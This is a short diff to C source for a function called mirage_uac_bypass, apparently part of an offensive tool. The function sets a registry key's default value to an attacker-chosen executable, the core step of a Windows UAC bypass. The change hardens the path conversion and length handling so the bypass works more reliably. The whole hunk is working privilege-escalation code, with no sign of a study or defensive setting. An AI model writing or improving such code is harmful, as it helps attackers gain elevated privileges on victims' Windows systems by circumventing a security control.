@@ -38,13 +38,12 @@ int mirage_uac_bypass(const char *exe_path) {
     if (result != ERROR_SUCCESS) return -1;
     
     /* Set default value to our executable */
-    WCHAR wpath[512];
-    for (size_t i = 0; i < 512 && exe_path[i]; i++)
-        wpath[i] = (WCHAR)exe_path[i];
-    wpath[strlen(exe_path)] = 0;
+    WCHAR wpath[1024];
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, exe_path, -1, wpath, 1024);
+    if (wlen <= 0 || wlen > 1024) { RegCloseKey(hKey); return -1; }
     
     result = RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)wpath,
-                            (DWORD)((wcslen(wpath) + 1) * sizeof(WCHAR)));
+                            (DWORD)(wlen * sizeof(WCHAR)));
     RegCloseKey(hKey);
     if (result != ERROR_SUCCESS) return -1;
     
